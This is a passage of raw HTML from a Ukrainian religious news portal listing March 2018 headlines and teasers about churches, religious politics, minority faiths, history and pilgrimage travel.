представляє МАРГАРЕТ МАЙЄР.</p></li><li class="important"><a href="https://risu.org.ua/ua/index/exclusive/reportage/70385/" class="thumb"><img src="php_uploads/images/articles/ArticlePreviewImage_70385.jpg" alt="" ></a><p class="attributes"><span class="date">12 березня 2018, 10:05</span>&nbsp;|&nbsp;<span class="category">Репортажі</span>&nbsp;|&nbsp;<span class="comments"></span></p><p><a href="https://risu.org.ua/ua/index/exclusive/reportage/70385/">Львів готується стати центром активного парафіяльного життя Європи</a></p><p>Львів з 27 липня по 1 серпня 2019 року прийматиме 30-й, ювілейний, Колоквіум європейських парафій (СЕР), що об’єднує священиків і мирян, які хотіли б надати більш динамічного життя своїм парафіям. Очікується на приїзд 150-ти учасників СЕР з різних країн Європи.</p></li><li class="important"><a href="https://risu.org.ua/ua/index/expert_thought/authors_columns/tderkach_column/70383/" class="thumb"><img src="php_uploads/images/articles/ArticlePreviewImage_70383.jpg" alt="" ></a><p class="attributes"><span class="date">11 березня 2018, 12:54</span>&nbsp;|&nbsp;<span class="category">Колонка Тетяни Деркач</span> |
 <a class="hasPhotos"><img alt="view photo" src="im/icon_photo.gif"></img></a>&nbsp;|&nbsp;<span class="comments"></span></p><p><a href="https://risu.org.ua/ua/index/expert_thought/authors_columns/tderkach_column/70383/">Балканська криза православ'я</a></p><p>Останнім часом православні Балкани підкидають багато інформаційних приводів, і поки виглядає так, що хвиля скандалів там вщухне не скоро.</p></li><li class="important"><a href="https://risu.org.ua/ua/index/neformat/70374/" class="thumb"><img src="php_uploads/images/articles/ArticlePreviewImage_70374.jpg" alt="" ></a><p class="attributes"><span class="date">9 березня 2018, 14:36</span>&nbsp;|&nbsp;<span class="category">#НеФормат</span> |
 <a class="hasPhotos"><img alt="view photo" src="im/icon_photo.gif"></img></a>&nbsp;|&nbsp;<span class="comments"></span></p><p><a href="https://risu.org.ua/ua/index/neformat/70374/">Шевченко і німці: хто і відколи садив картоплю на Січі</a></p><p>Понад 200 років тому на землях війська Запорізького оселилися колоністи з Німеччини, які належали до протестантської церкви менонітів. Саме про них у своїх творах згадує Тарас Шевченко.</p></li><li class="important"><a href="https://risu.org.ua/ua/index/exclusive/reportage/70354/" class="thumb"><img src="php_uploads/images/articles/ArticlePreviewImage_70354.gif" alt="" ></a><p class="attributes"><span class="date">7 березня 2018, 17:12</span>&nbsp;|&nbsp;<span class="category">Репортажі</span>&nbsp;|&nbsp;<span class="comments"></span></p><p><a href="https://risu.org.ua/ua/index/exclusive/reportage/70354/">Муфтій Саїд Ісмагілов: Маю підстави вважати обшуки в мечетях систематичними</a></p><p>Після вчорашнього ранкового обшуку в Ісламському культурному центрі м. Києва є всі підстави вважати подібні дії правоохоронців систематичними, оскільки це вже четвертий випадок за останні два роки. Про це заявив муфтій Духовного управління мусульман України «Умма» Саїд Ісмагілов на прес-конференції у Главкомі в середу, 7 березня, у Києві.</p></li><li class="important"><a href="https://risu.org.ua/ua/index/exclusive/holidays_and_customs/70348/" class="thumb"><img src="php_uploads/images/articles/ArticlePreviewImage_70348.jpg" alt="" ></a><p class="attributes"><span class="date">7 березня 2018, 13:30</span>&nbsp;|&nbsp;<span class="category">Свята і звичаї</span> |
 <a class="hasPhotos"><img alt="view photo" src="im/icon_photo.gif"></img></a>&nbsp;|&nbsp;<span class="comments"></span></p><p><a href="https://risu.org.ua/ua/index/exclusive/holidays_and_customs/70348/">Пуримшпіль і «Собака на сіні». Кінематограф у традиціях Волинської релігійної общини прогресивного юдаїзму</a></p><p>Пурим – цілковито особливе свято, під час якого в общині можна робити все, що завгодно, а в пурімшпілі (святковій карнавальній виставі) навіть відобразити конкретних людей та їхні риси</p></li><li class="important"><a href="https://risu.org.ua/ua/index/exclusive/review/70330/" class="thumb"><img src="php_uploads/images/articles/ArticlePreviewImage_70330.jpg" alt="" ></a><p class="attributes"><span class="date">6 березня 2018, 10:57</span>&nbsp;|&nbsp;<span class="category">Огляд подій</span> |
 <a class="hasPhotos"><img alt="view photo" src="im/icon_photo.gif"></img></a>&nbsp;|&nbsp;<span class="comments"></span></p><p><a href="https://risu.org.ua/ua/index/exclusive/review/70330/">За лаштунками болгарського вояжу Патріарха Кирила</a></p><p>З 2 по 4 березня російський Патріарх Кирил здійснив робочу поїздку до Болгарії. В ході візиту він зустрівся не тільки з болгарським Патріархом та місцевим духовенством, але й відвідав вище керівництво країни. Ця поїздка би не привернула увагу аналітиків, якби не одне «але». Під час офіційного візиту стався справжній дипломатичний скандал.</p></li><li class="important"><a href="https://risu.org.ua/ua/index/exclusive/reportage/70285/" class="thumb"><img src="php_uploads/images/articles/ArticlePreviewImage_70285.jpg" alt="" ></a><p class="attributes"><span class="date">2 березня 2018, 12:57</span>&nbsp;|&nbsp;<span class="category">Репортажі</span>&nbsp;|&nbsp;<span class="comments"></span></p><p><a href="https://risu.org.ua/ua/index/exclusive/reportage/70285/">Постать відомого ченця-історика Церкви зібрала дослідників в Ужгороді</a></p><p>Семінар, присвячений життю та спадщині о. Атанасія Пекаря, ЧСВВ відбувся в Ужгородському національному університеті 1 березня 2018 р. — у день народження цього історика Церкви. Подія отримала назву «Життя присвячене Правді: ієромонах Атанасій Василь Пекар, ЧСВВ та його “Нариси історії Церкви Закарпаття”».</p></li></ul><div class="more"></div></div><div class=portlet-position style="width:100%"></div><div class="contentItem infoBlockMain"><div class="topBar yellow"><div class="ltc"></div><div class="rtc"></div><h1>Моніторинг ЗМІ</h1></div><div class="shadow"></div><ul><li class="important"><p><span><a href="https://risu.org.ua/ua/index/monitoring/society_digest/70431/">Опальный священник Игорь Савва о конфликте с Московским патриархатом: &quot;Там могут сказать про ДНР - “наши”, а про Порошенко - “каратели”</a></span><span class="attributes"> |
 <span class="date">14 березня 2018, 19:46</span>&nbsp;|&nbsp;<span class="category">Суспільство-дайджест</span> |
 <a class="hasPhotos"><img alt="view photo" src="im/icon_photo.gif"></img></a> |
 <a class="hasPhotos"><img alt="view video" src="im/icon_video.gif"></img></a>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li><p><span><a href="https://risu.org.ua/ua/index/monitoring/society_digest/70412/">Операция &quot;Дары волхвов&quot;. Как РПЦ стала отделом администрации Путина</a></span><span class="attributes"> |
 <span class="date">13 березня 2018, 22:52</span>&nbsp;|&nbsp;<span class="category">Суспільство-дайджест</span> |
 <a class="hasPhotos"><img alt="view photo" src="im/icon_photo.gif"></img></a>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li><p><span><a href="https://risu.org.ua/ua/index/monitoring/society_digest/70409/">Таємниці Володимирського собору. Звідки Котарбінський знав, як виглядав Христос?</a></span><span class="attributes"> |
 <span class="date">13 березня 2018, 16:58</span>&nbsp;|&nbsp;<span class="category">Суспільство-дайджест</span> |
 <a class="hasPhotos"><img alt="view photo" src="im/icon_photo.gif"></img></a> |
 <a class="hasPhotos"><img alt="view video" src="im/icon_video.gif"></img></a>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li><p><span><a href="https://risu.org.ua/ua/index/monitoring/society_digest/70392/">&quot;ЗА ЧАЙ.COM&quot;: Людмила Филипович про &quot;православіє головного мозку&quot; та совковий атеїзм</a></span><span class="attributes"> |
 <span class="date">12 березня 2018, 12:58</span>&nbsp;|&nbsp;<span class="category">Суспільство-дайджест</span>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li><p><span><a href="https://risu.org.ua/ua/index/monitoring/kaleido_digest/70352/">Зустрітись з собою. Отець Богдан Прах про те, чому варто постити</a></span><span class="attributes"> |
 <span class="date">7 березня 2018, 15:03</span>&nbsp;|&nbsp;<span class="category">Калейдоскоп-дайджест</span> |
 <a class="hasPhotos"><img alt="view photo" src="im/icon_photo.gif"></img></a>&nbsp;|&nbsp;<span class="comments"></span></span></p></li></ul><div class="more"></div></div><div class=portlet-position style="width:100%"></div><div class="contentItem infoBlockMain"><div class="topBar yellow"><div class="ltc"></div><div class="rtc"></div><h1>Релігієзнавчі студії</h1></div><div class="shadow"></div><ul><li class="important"><a href="https://risu.org.ua/ua/index/studios/studies_of_religions/70453/" class="thumb"><img src="php_uploads/images/articles/ArticlePreviewImage_70453.jpg" alt="" ></a><p class="attributes"><span class="date">16 березня 2018, 11:04</span>&nbsp;|&nbsp;<span class="category">Релігієзнавчі студії</span>&nbsp;|&nbsp;<span class="comments"></span></p><p><a href="https://risu.org.ua/ua/index/studios/studies_of_religions/70453/">“Віра і розум” очима протестанта</a></p><p>Авторські рефлексії присвячені переосмисленню основних положень папського послання “Віра і розум” в контексті діалогу з провідними протестантськими інтелектуалами – Карлом Генрі та Алвіном Плантінгою.</p></li><li class="important"><a href="https://risu.org.ua/ua/index/studios/studies_of_religions/69925/" class="thumb"><img src="php_uploads/images/articles/ArticlePreviewImage_69925.jpg" alt="" ></a><p class="attributes"><span class="date">31 січня 2018, 17:46</span>&nbsp;|&nbsp;<span class="category">Релігієзнавчі студії</span> |
 <a class="hasPhotos"><img alt="view photo" src="im/icon_photo.gif"></img></a>&nbsp;|&nbsp;<span class="comments"></span></p><p><a href="https://risu.org.ua/ua/index/studios/studies_of_religions/69925/">Релігійні питання в Гадяцькому договорі 1658 р.</a></p><p>Гадяцький договір 1658 р., що був укладений між Гетьманатом, який у той час очолював Іван Виговський, та Річчю Посполитою, є добре відомим. Однак дослідники звертають переважно увагу на те, що в цьому договорі прописувалося створення Руського князівства. І не акцентують увагу на його релігійній складовій.</p></li></ul><div class="more"></div></div><div class=portlet-position style="width:100%"></div><div class="contentItem infoBlockMain"><div class="topBar yellow"><div class="ltc"></div><div class="rtc"></div><h1>Огляд видань</h1></div><div class="shadow"></div><ul><li class="important"><a href="https://risu.org.ua/ua/index/studios/announcements_of_publications/70401/" class="thumb"><img src="php_uploads/images/articles/ArticlePreviewImage_70401.jpg" alt="" ></a><p class="attributes"><span class="date">13 березня 2018, 12:53</span>&nbsp;|&nbsp;<span class="category">Огляд видань</span>&nbsp;|&nbsp;<span class="comments"></span></p><p><a href="https://risu.org.ua/ua/index/studios/announcements_of_publications/70401/">«Після богослов’я»: про книжку «Мета-еклезіологія» о. Кирила (Говоруна)</a></p><p>Наприкінці січні ц.р. у видавництві «Дух і літера» вийшов переклад українською книги архимандрита Кирила (Говоруна) «Мета-еклезіологія: Хроніки самоусвідомлення Церкви». Оригінал був написаний англійською мовою в США у 2015.</p></li><li class="important"><a href="https://risu.org.ua/ua/index/studios/announcements_of_publications/70393/" class="thumb"><img src="php_uploads/images/articles/ArticlePreviewImage_70393.jpg" alt="" ></a><p class="attributes"><span class="date">12 березня 2018, 15:25</span>&nbsp;|&nbsp;<span class="category">Огляд видань</span>&nbsp;|&nbsp;<span class="comments"></span></p><p><a href="https://risu.org.ua/ua/index/studios/announcements_of_publications/70393/">“Йти до сповіді? Боюся” – актуальна тема березневої “Кани”</a></p><p>Найбільший ажіотаж перед сповідальницею зазвичай спостерігається під час Великого посту. Для когось це чергова нагода покаятися, а для когось – виконати обов’язок раз на рік. А дехто вже й ніколи не прийде до сповіді, бо мав негативний досвід попереднього разу.</p></li></ul><div class="more"></div></div><div class=portlet-position style="width:100%"></div><div class="contentItem quot"><div class="header"><h2>Цитата</h2></div><div class="bodyText"><p><a href="https://risu.org.ua/ua/index/expert_thought/interview/69565/">Московська патріархія отримала «добро» зіграти свою роль у кремлівському псевдо-миротворчому сценарії. Це «умиротворення» полягає у поєднанні гібридної війни в усіх її фазах, включно із військовою, з пропозицією «миру» для України.</a></p><p class='author'></p></div></div></div></div><div class="item column" id="maincontent"><script type="text/javascript">
        $(document).ready(function(){
          browserchack("UA");
 });
 </script><div class=robots-nocontent><div class=portlet-position style="width:100%"></div><div class="contentItem banner"><noindex><a href="https://risu.org.ua/ua/index/resourses/calendar/calendar_archive/69545/"><img src="php_uploads/images/portlets/PortletImage_UA_220.gif" alt="" ></a></noindex></div><div class=portlet-position style="width:100%"></div><div class="contentItem infoBlockMain"><div class="topBar yellow"><div class="ltc"></div><div class="rtc"></div><h1>Останні новини</h1></div><div class="shadow"></div><ul><li><p><span><a href="https://risu.org.ua/ua/index/all_news/ukraine_and_world/international_relations/70463/">Патріарх УГКЦ у Варшаві: «Кремль підтримує популістів і провокує ненависть у Європі»</a></span><span class="attributes"> |
 <span class="date">16 березня 2018, 15:20</span>&nbsp;|&nbsp;<span class="category">Міжнародні відносини</span>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li class="important"><p><span><a href="https://risu.org.ua/ua/index/all_news/orthodox/uoc/70462/">Помер архиєпископ УПЦ (МП)</a></span><span class="attributes"> |
 <span class="date">16 березня 2018, 15:15</span>&nbsp;|&nbsp;<span class="category">УПЦ  (МП)</span>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li class="important"><p><span><a href="https://risu.org.ua/ua/index/all_news/community/freedom_of_conscience/70461/">У столиці презентували доповідь про релігійні переслідування в Криму</a><img src="im/exclusive-UA.gif" alt="" class="exclusive"></span><span class="attributes"> |
 <span class="date">16 березня 2018, 14:44</span>&nbsp;|&nbsp;<span class="category">Свобода совісті</span>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li><p><span><a href="https://risu.org.ua/ua/index/all_news/culture/history/70460/">Вчені виявили трактат давньогрецького лікаря Галена на пергаменті з християнськими текстами</a></span><span class="attributes"> |
 <span class="date">16 березня 2018, 13:30</span>&nbsp;|&nbsp;<span class="category">Історія, археологія</span>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li><p><span><a href="https://risu.org.ua/ua/index/all_news/community/scandals/70459/">Невідомі облили червоною фарбою ворота монастиря УПЦ (МП)</a></span><span class="attributes"> |
 <span class="date">16 березня 2018, 12:46</span>&nbsp;|&nbsp;<span class="category">Скандали, кримінал, адмінпорушення</span>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li class="important"><p><span><a href="https://risu.org.ua/ua/index/all_news/community/religion_and_society/70458/">Християни України закликають співгромадян підписати петицію про захист сімейних цінностей та засудити гомосексуалізм</a></span><span class="attributes"> |
 <span class="date">16 березня 2018, 12:28</span>&nbsp;|&nbsp;<span class="category">Релігія і суспільство</span>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li><p><span><a href="https://risu.org.ua/ua/index/all_news/culture/history/70457/">У центрі Вінниці виявили невідомі до того монастирські підземні ходи</a></span><span class="attributes"> |
 <span class="date">16 березня 2018, 12:20</span>&nbsp;|&nbsp;<span class="category">Історія, археологія</span>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li><p><span><a href="https://risu.org.ua/ua/index/all_news/community/religion_and_society/70455/">У Зарваниці орденом «За спасіння життя» нагородили відважних українців</a></span><span class="attributes"> |
 <span class="date">16 березня 2018, 11:52</span>&nbsp;|&nbsp;<span class="category">Релігія і суспільство</span>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li><p><span><a href="https://risu.org.ua/ua/index/all_news/ukraine_and_world/ukrainians_outside_of_Ukraine/70456/">У Польщі  запевнили Главу УГКЦ, що українці-заробітчани матимуть місця для молитви</a></span><span class="attributes"> |
 <span class="date">16 березня 2018, 11:49</span>&nbsp;|&nbsp;<span class="category">Українці поза Україною</span>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li><p><span><a href="https://risu.org.ua/ua/index/all_news/community/scandals/70454/">У Києві всьоме підпалили храм УПЦ (МП) в Бабиному Яру</a></span><span class="attributes"> |
 <span class="date">16 березня 2018, 11:22</span>&nbsp;|&nbsp;<span class="category">Скандали, кримінал, адмінпорушення</span>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li><p><span><a href="https://risu.org.ua/ua/index/all_news/community/land_and_property_problems/70452/">«Правий сектор» пролобіював виділення землі УПЦ КП на Полтавщині</a></span><span class="attributes"> |
 <span class="date">16 березня 2018, 11:07</span>&nbsp;|&nbsp;<span class="category">Земельні і мaйнові проблеми</span>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li class="important"><p><span><a href="https://risu.org.ua/ua/index/all_news/ukraine_and_world/international_relations/70451/">У Варшаві Патріарх УГКЦ закликав до примирення поляків та українців</a></span><span class="attributes"> |
 <span class="date">16 березня 2018, 10:21</span>&nbsp;|&nbsp;<span class="category">Міжнародні відносини</span>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li><p><span><a href="https://risu.org.ua/ua/index/all_news/ukraine_and_world/international_relations/70450/">Президент Австрії до студентів УКУ: “Університет дає людині здатність “тримати очі відкритими“”</a></span><span class="attributes"> |
 <span class="date">16 березня 2018, 10:12</span>&nbsp;|&nbsp;<span class="category">Міжнародні відносини</span>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li><p><span><a href="https://risu.org.ua/ua/index/all_news/other_confessions/judaism/70449/">Рабини з Дніпра взяли участь у щорічній конференції європейських рабинів у Бухаресті</a></span><span class="attributes"> |
 <span class="date">16 березня 2018, 09:39</span>&nbsp;|&nbsp;<span class="category">Юдейство</span>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li><p><span><a href="https://risu.org.ua/ua/index/all_news/world_news/70448/">РКЦ відновить три лікарні у Сирії</a></span><span class="attributes"> |
 <span class="date">16 березня 2018, 09:21</span>&nbsp;|&nbsp;<span class="category">Світові</span>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li><p><span><a href="https://risu.org.ua/ua/index/all_news/world_news/70444/">У Стамбулі відкриють найбільшу в Європі мечеть</a></span><span class="attributes"> |
 <span class="date">15 березня 2018, 16:21</span>&nbsp;|&nbsp;<span class="category">Світові</span>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li><p><span><a href="https://risu.org.ua/ua/index/all_news/community/religion_and_society/70443/">У всіх храмах УГКЦ на Прикарпатті одночасно битимуть в дзвони у пам'ять жертв НКВС</a></span><span class="attributes"> |
 <span class="date">15 березня 2018, 14:45</span>&nbsp;|&nbsp;<span class="category">Релігія і суспільство</span>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li><p><span><a href="https://risu.org.ua/ua/index/all_news/world_news/70442/">В РПЦ прокоментували нові санкції Великої Британії проти Росії</a></span><span class="attributes"> |
 <span class="date">15 березня 2018, 14:42</span>&nbsp;|&nbsp;<span class="category">Світові</span>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li><p><span><a href="https://risu.org.ua/ua/index/all_news/community/religion_and_policy/70441/">«Там можуть сказати про ДНР - «наші», а про Порошенка – «карателі», - запорізький священик Ігор Савва про настрої в єпархії</a></span><span class="attributes"> |
 <span class="date">15 березня 2018, 13:18</span>&nbsp;|&nbsp;<span class="category">Релігія і політика</span>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li><p><span><a href="https://risu.org.ua/ua/index/all_news/community/charity/70439/">Триває благодійна акція Карітасу України «Великодня пожертва»</a></span><span class="attributes"> |
 <span class="date">15 березня 2018, 12:25</span>&nbsp;|&nbsp;<span class="category">Благодійність, соціальне служіння</span>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li><p><span><a href="https://risu.org.ua/ua/index/all_news/catholics/vatikan/70438/">Вийшов трейлер документального фільму з Папою Франциском</a></span><span class="attributes"> |
 <span class="date">15 березня 2018, 11:57</span>&nbsp;|&nbsp;<span class="category">Ватикан</span>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li><p><span><a href="https://risu.org.ua/ua/index/all_news/community/charity/70437/">При кожній парафії УГКЦ створять групу конкретних справ милосердя</a></span><span class="attributes"> |
 <span class="date">15 березня 2018, 11:45</span>&nbsp;|&nbsp;<span class="category">Благодійність, соціальне служіння</span>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li><p><span><a href="https://risu.org.ua/ua/index/all_news/community/religion_and_society/70436/">Канонічні гроби: експерт про рішення Синоду УПЦ (МП)</a></span><span class="attributes"> |
 <span class="date">15 березня 2018, 11:08</span>&nbsp;|&nbsp;<span class="category">Релігія і суспільство</span>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li><p><span><a href="https://risu.org.ua/ua/index/all_news/ukraine_and_world/international_relations/70435/">Сьогодні розпочався візит Патріарха УГКЦ до Польщі</a></span><span class="attributes"> |
 <span class="date">15 березня 2018, 10:31</span>&nbsp;|&nbsp;<span class="category">Міжнародні відносини</span>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li><p><span><a href="https://risu.org.ua/ua/index/all_news/culture/religious_media_and_Internet/70434/">Фейки — у центрі уваги медіа-форуму «Церква і журналістика»</a><img src="im/exclusive-UA.gif" alt="" class="exclusive"></span><span class="attributes"> |
 <span class="date">15 березня 2018, 10:28</span>&nbsp;|&nbsp;<span class="category">Релігійні мас-медіа та Інтернет</span> |
 <a class="hasPhotos"><img alt="view photo" src="im/icon_photo.gif"></img></a>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li><p><span><a href="https://risu.org.ua/ua/index/all_news/world_news/70433/">Зачепило за живе: В РПЦ заявили, що мають наукові докази “чудесності” Благодатного вогню</a></span><span class="attributes"> |
 <span class="date">15 березня 2018, 10:07</span>&nbsp;|&nbsp;<span class="category">Світові</span>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li><p><span><a href="https://risu.org.ua/ua/index/all_news/community/faith_and_weapon/70432/">Волонтери з Львівщини привезли бійцям АТО чудотворні ікони</a></span><span class="attributes"> |
 <span class="date">15 березня 2018, 09:30</span>&nbsp;|&nbsp;<span class="category">Віра і зброя</span>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li><p><span><a href="https://risu.org.ua/ua/index/all_news/ukraine_and_world/ukrainians_outside_of_Ukraine/70430/">В українській церкві Парижа пройшов концерт на честь пам'яті Шевченка</a></span><span class="attributes"> |
 <span class="date">14 березня 2018, 16:38</span>&nbsp;|&nbsp;<span class="category">Українці поза Україною</span>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li><p><span><a href="https://risu.org.ua/ua/index/all_news/orthodox/uoc/70429/">УПЦ (МП) відкриє на Херсонщині жіночий монастир</a></span><span class="attributes"> |
 <span class="date">14 березня 2018, 15:55</span>&nbsp;|&nbsp;<span class="category">УПЦ  (МП)</span>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li><p><span><a href="https://risu.org.ua/ua/index/all_news/community/religion_and_society/70427/">Синод УПЦ (МП) розглянув ситуацію в Запоріжжі</a></span><span class="attributes"> |
 <span class="date">14 березня 2018, 15:33</span>&nbsp;|&nbsp;<span class="category">Релігія і суспільство</span>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li class="important"><p><span><a href="https://risu.org.ua/ua/index/all_news/orthodox/armenian_ac/70428/">Католікос всіх вірмен Гарегін II освятить вірменську церкву в Дніпрі</a></span><span class="attributes"> |
 <span class="date">14 березня 2018, 15:28</span>&nbsp;|&nbsp;<span class="category">Вірменська АЦ</span>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li class="important"><p><span><a href="https://risu.org.ua/ua/index/all_news/orthodox/uoc/70426/">В УПЦ (МП) два нових єпископи</a></span><span class="attributes"> |
 <span class="date">14 березня 2018, 14:56</span>&nbsp;|&nbsp;<span class="category">УПЦ  (МП)</span>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li><p><span><a href="https://risu.org.ua/ua/index/all_news/community/religion_and_society/70425/">Українські служителі закликали владу «припинити напади на реабцентри»</a></span><span class="attributes"> |
 <span class="date">14 березня 2018, 13:41</span>&nbsp;|&nbsp;<span class="category">Релігія і суспільство</span>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li><p><span><a href="https://risu.org.ua/ua/index/all_news/orthodox/uapc/70424/">Предстоятель УАПЦ Макарій звинуватив Наталію Шевчук у державній зраді</a></span><span class="attributes"> |
 <span class="date">14 березня 2018, 13:22</span>&nbsp;|&nbsp;<span class="category">УАПЦ</span>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li><p><span><a href="https://risu.org.ua/ua/index/all_news/community/temples_church_property/70416/">У Волновасі встановили куполи на храмі, який зводять волиняни</a></span><span class="attributes"> |
 <span class="date">14 березня 2018, 13:14</span>&nbsp;|&nbsp;<span class="category">Храми, церковне майно</span>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li><p><span><a href="https://risu.org.ua/ua/index/all_news/community/religion_and_policy/70421/">Для УПЦ (МП) мир в Україні – це перемога Росії, - запорізький священик Ігор Савва</a></span><span class="attributes"> |
 <span class="date">14 березня 2018, 11:48</span>&nbsp;|&nbsp;<span class="category">Релігія і політика</span>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li><p><span><a href="https://risu.org.ua/ua/index/all_news/community/religion_and_society/70422/">«Ювілейний рік минув, а милосердя має тривати», - владика УГКЦ Богдан (Дзюрах)</a></span><span class="attributes"> |
 <span class="date">14 березня 2018, 11:45</span>&nbsp;|&nbsp;<span class="category">Релігія і суспільство</span>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li><p><span><a href="https://risu.org.ua/ua/index/all_news/orthodox/uoc/70418/">В УПЦ (МП) просять молитися за здоров’я архиєпископа Іларія</a></span><span class="attributes"> |
 <span class="date">14 березня 2018, 11:16</span>&nbsp;|&nbsp;<span class="category">УПЦ  (МП)</span>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li><p><span><a href="https://risu.org.ua/ua/index/all_news/community/terrorism/70419/">Біля польських поховань на Личаківському цвинтарі у Львові стався вибух</a></span><span class="attributes"> |
 <span class="date">14 березня 2018, 11:15</span>&nbsp;|&nbsp;<span class="category">Тероризм</span>&nbsp;|&nbsp;<span class="comments"></span></span></p></li><li class="important"><p><span><a href="https://risu.org.ua/ua/index/all_news/orthodox/uoc/70417/">У Києві розпочав роботу Синод УПЦ (МП)</a></span><span class="attributes"> |
 <span class="date">14 березня 2018, 11:10</span>&nbsp;|&nbsp;<span class="category">УПЦ  (МП)</span>&nbsp;|&nbsp;<span class="comments"></span></span></p></li></ul><div class="more"></div></div><div class=portlet-position style="width:100%"></div><div class="contentItem infoBlockMain"><div class="topBar yellow"><div class="ltc"></div><div class="rtc"></div><h1>Народний репортер</h1></div><div class="shadow"></div><ul><li class="important"><a href="https://risu.org.ua/ua/index/popular_reporter/68747/" class="thumb"><img src="php_uploads/images/articles/ArticlePreviewImage_68747.jpg" alt="" ></a><p class="attributes"><span class="date">25 жовтня 2017, 12:40</span>&nbsp;|&nbsp;<span class="category">Народний репортер</span> |
 <a class="hasPhotos"><img alt="view photo" src="im/icon_photo.gif"></img></a>&nbsp;|&nbsp;<span class="comments"></span></p><p><a href="https://risu.org.ua/ua/index/popular_reporter/68747/">«Місія до народів»: народження нової парафії у місті Рівному</a></p><p>Три роки тому у Рівному розпочалося будівництво нового римо-католицького храму. Наразі церква ще недобудована, але минулої неділі, 22 жовтня, у ній відбулося перше Богослужіння, яке очолив єпископ-ординарій Луцької дієцезії Віталій Скомаровський. Чим особлива нова парафія святого Івана Павла ІІ?</p></li></ul><div class="more"></div></div><div class=portlet-position style="width:100%"></div><div class="contentItem infoBlockMain"><div class="topBar yellow"><div class="ltc"></div><div class="rtc"></div><h1>Релігійне краєзнавство</h1></div><div class="shadow"></div><ul><li class="important"><a href="https://risu.org.ua/ua/relig_tourism/religious_region/70301/" class="thumb"><img src="php_uploads/images/articles/ArticlePreviewImage_70301.jpg" alt="" ></a><p class="attributes"><span class="date">3 березня 2018, 18:53</span>&nbsp;|&nbsp;<span class="category">Релігійне краєзнавство</span> |
 <a class="hasPhotos"><img alt="view photo" src="im/icon_photo.gif"></img></a>&nbsp;|&nbsp;<span class="comments"></span></p><p><a href="https://risu.org.ua/ua/relig_tourism/religious_region/70301/">Алушта: бастіон Помор'я</a></p><p>Сьогодні лишень руїни двох веж, загублені серед будівель готельного типу нагадують про давній Алустон.</p></li><li class="important"><a href="https://risu.org.ua/ua/relig_tourism/r_maps/regions/ternopilska/mykulyntsi/69826/" class="thumb"><img src="php_uploads/images/articles/ArticlePreviewImage_69826.jpg" alt="" ></a><p class="attributes"><span class="date">26 січня 2018, 14:02</span>&nbsp;|&nbsp;<span class="category">Микулинці</span> |
 <a class="hasPhotos"><img alt="view photo" src="im/icon_photo.gif"></img></a>&nbsp;|&nbsp;<span class="comments"></span></p><p><a href="https://risu.org.ua/ua/relig_tourism/r_maps/regions/ternopilska/mykulyntsi/69826/">Микулинці — “королівський костел” та примари</a></p><p>Пересічний українець знає про Микулинці, що біля Теребовлі, переважно завдяки чудовому місцевому пиву. Про інші принади цього надзвичайно цікавого і симпатичного галицького містечка загалу відомо набагато менше. Натомість серед шанувальників мандрів вітчизняною “глибинкою” Микулинці давно користуються заслуженою славою.</p></li></ul><div class="more"></div></div><div class=portlet-position style="width:100%"></div><div class="contentItem infoBlockMain"><div class="topBar grey"><div class="ltc"></div><div class="rtc"></div><h1>Записки мандрівників</h1></div><div class="shadow"></div><ul><li class="important"><a href="https://risu.org.ua/ua/relig_tourism/travel_notes/travel_autors/poliukhovych_travel/70028/" class="thumb"><img src="php_uploads/images/articles/ArticlePreviewImage_70028.jpg" alt="" ></a><p class="attributes"><span class="date">9 лютого 2018, 09:26</span>&nbsp;|&nbsp;<span class="category">Мандри Дмитра Полюховича</span> |
 <a class="hasPhotos"><img alt="view photo" src="im/icon_photo.gif"></img></a>&nbsp;|&nbsp;<span class="comments"></span></p><p><a href="https://risu.org.ua/ua/relig_tourism/travel_notes/travel_autors/poliukhovych_travel/70028/">Буцнів і Острів — віадук, храми та сльози Богородиці</a></p><p>Завдяки активній телевізійній “розкрутці” складно знайти людину, яка би хоч краєм вуха не чула про Плебанівський віадук, що височіє на околицях Теребовлі. Натомість про аналогічний віадук на кордоні Буцнева та Острова загалу практично невідомо. А дарма.</p></li></ul><div class="more"></div></div><div class=portlet-position style="width:100%"></div><div class="contentItem banner"><!--/* OpenX Javascript Tag v2.8.7 */-->

<!--/*
  * The backup image section of this tag has been generated for use on a
  * non-SSL page. If this tag is to be placed on an SSL page, change the
